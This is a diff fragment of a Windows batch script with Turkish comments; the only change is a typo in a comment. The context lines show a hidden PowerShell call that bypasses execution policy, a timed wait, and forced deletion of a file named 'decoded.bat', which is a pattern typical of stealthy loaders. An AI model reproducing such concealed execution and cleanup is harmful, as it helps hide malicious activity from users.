@@ -27,7 +27,7 @@ powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Command "Star
 :: çalıştıktan sonra 30 saniye bekle
 ping -n 31 127.0.0.1 >nul
 
-:: decoded.bat dosyasını sil
+:: decoded.bat dosyasını silz
 del /f /q decoded.bat
 
 exit
